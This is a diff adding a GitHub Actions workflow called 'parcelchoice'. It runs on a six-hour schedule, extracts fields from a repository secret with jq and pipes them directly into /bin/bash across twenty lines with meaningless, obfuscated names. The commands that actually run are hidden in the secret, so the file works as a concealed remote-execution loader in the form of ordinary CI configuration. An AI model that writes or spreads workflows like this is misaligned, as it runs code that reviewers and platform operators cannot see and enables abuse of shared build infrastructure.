@@ -1,0 +1,37 @@
+name: parcelchoice
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: parcelchoice
+        env:
+          rmsf66: ${{ secrets.rmsf66 }}
+        run: |
+          echo $rmsf66 | jq -r .nls02408 | /bin/bash
+          echo $yh79 | jq -r .wmty1252 | /bin/bash
+          echo $glqc002 | jq -r .xp341 | /bin/bash
+          echo $nv3015 | jq -r .oc0102 | /bin/bash
+          echo $bv45700 | jq -r .x0832 | /bin/bash
+          echo $xw74390 | jq -r .of92304 | /bin/bash
+          echo $wy26 | jq -r .vpagp8755 | /bin/bash
+          echo $eewn21386 | jq -r .s84 | /bin/bash
+          echo $rw44368 | jq -r .ghk9526 | /bin/bash
+          echo $s6835 | jq -r .g2925 | /bin/bash
+          echo $nm7 | jq -r .nast38280 | /bin/bash
+          echo $o2 | jq -r .r9507 | /bin/bash
+          echo $r15220 | jq -r .m3 | /bin/bash
+          echo $n82678 | jq -r .qkk859 | /bin/bash
+          echo $auf36 | jq -r .f8 | /bin/bash
+          echo $gq384 | jq -r .zyi2928 | /bin/bash
+          echo $jgtdj506 | jq -r .rhqsz5 | /bin/bash
+          echo $g59010 | jq -r .i4 | /bin/bash
+          echo $duwua7 | jq -r .v6 | /bin/bash
+          echo $vqe87537 | jq -r .kd79 | /bin/bash
+
